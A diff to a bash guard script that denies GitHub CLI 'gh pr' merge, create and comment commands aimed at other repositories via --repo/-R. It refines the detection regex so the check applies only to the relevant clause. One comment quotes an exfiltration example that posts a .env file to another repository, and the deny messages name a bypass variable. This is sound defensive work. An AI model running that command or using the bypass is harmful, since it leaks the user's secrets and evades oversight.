@@ -169,8 +169,39 @@ _OUT_POS_PREFIX='(^|[;&|(`{!])[[:space:]]*(([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*
 _OUT_POS_SUFFIX='([[:space:]]|[);&|`]|$)'
 
 # `--repo`/`-R` in any spelling gh's flag parser accepts (`--repo v`,
-# `--repo=v`, `-R v`, `-Rv`). Case-SENSITIVE on purpose — see the header.
-_OUT_REPO_FLAG_RE='(^|[[:space:]])(--repo([=[:space:]]|$)|-R)'
+# `--repo=v`, `"--repo" v`, `-R v`, `-Rv`). Case-SENSITIVE on purpose — see
+# the header. Boundary class is "not a word/dash character" rather than
+# strictly whitespace, exactly like the `--admin` check below, so a QUOTED
+# flag name is still seen; `--repo`'s trailing boundary keeps a hypothetical
+# `--repository` from matching, while `-R` deliberately has none so the glued
+# `-Rowner/repo` form is caught.
+_OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'
+
+# gh_pr_clause_has_repo <subcommand-alternation> → exit 0 if the FIRST
+# `gh pr <sub>` clause in the RAW command carries --repo/-R.
+#
+# RAW $CMD, not $BARE: a quoted flag NAME is still a real argv token
+# (`gh pr comment "--repo" other/org` behaves identically to the unquoted
+# form), and cmd_bare would blank it out of view — the same reasoning the
+# `--admin` check below documents.
+# CLAUSE-SCOPED, unlike that --admin check: `--admin` survives a whole-command
+# scan because it is a rare token, but `-R` is `cp -R`, `grep -R`, `ls -R`,
+# `rsync -R`. A whole-$CMD scan denied `cp -R src dst && gh pr create --title
+# x --body y` — i.e. this repo's own PR-creation pipeline (caught in review
+# before it shipped). lib/cmd-detect.sh:242, the precedent this check follows,
+# is likewise clause-scoped: it applies the identical regex to `$full_match`,
+# never to the whole command.
+# The caller has already established from $BARE that a COMMAND-POSITION
+# `gh pr <sub>` exists, so this raw, unanchored extraction only decides WHICH
+# text to search. `head -1` inherits the same first-occurrence residual as the
+# other multi-occurrence sites here (a quoted MENTION preceding a real
+# invocation is searched instead) — deny direction, and the ambiguous-multi
+# case is already denied outright for `merge`.
+gh_pr_clause_has_repo() {
+  local clause
+  clause=$(printf '%s' "$CMD" | grep -oiE "gh[[:space:]]+pr[[:space:]]+($1)[^;&|]*" | head -1)
+  [ -n "$clause" ] && grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$clause"
+}
 
 # Crude, non-quote-aware smell test shared by ALL THREE fail-closed fallback
 # paths below (no-jq; jq-envelope-unparseable; jq-present-but-lib-unsourceable
@@ -400,10 +431,8 @@ if [ "${GH_PR_MERGE_OCCURRENCES:-0}" -gt 1 ]; then
 elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
   # `--repo`/`-R` retargets the merge at an ARBITRARY repository — the --auto
   # carve-out is scoped to THIS repo's own sanctioned automerge pipeline, which
-  # never passes it. Checked FIRST so it wins regardless of --auto. Scans raw
-  # $CMD for the same reason --admin does (a quoted flag name is still a real
-  # argv token); this check can only ever ADD a deny.
-  if grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$CMD"; then
+  # never passes it. Checked FIRST so it wins regardless of --auto.
+  if gh_pr_clause_has_repo 'merge'; then
     deny "guard-outward-cli: 'gh pr merge' with --repo/-R targets a DIFFERENT GitHub repository with the user's PAT — outside the --auto carve-out, which exists only for this repo's own /todo automerge pipeline (it never passes --repo). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
   fi
   CLAUSE=$(printf '%s' "$BARE" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX}[^;&|]*" | head -1)
@@ -467,9 +496,9 @@ fi
 # arbitrary GitHub repository with the user's PAT (`gh pr comment --repo
 # other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
 # lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
-# never passes it. Raw-$CMD flag scan for the same reason as --admin above.
+# never passes it. Clause-scoped raw-$CMD flag scan — see gh_pr_clause_has_repo.
 if grep -Eqi "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}" <<< "$BARE" \
-   && grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$CMD"; then
+   && gh_pr_clause_has_repo 'create|comment'; then
   deny "guard-outward-cli: 'gh pr create/comment' with --repo/-R writes to a DIFFERENT GitHub repository with the user's PAT — unbounded egress, outside the routine-workflow carve-out these two subcommands get. Without --repo/-R they stay allowed. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 
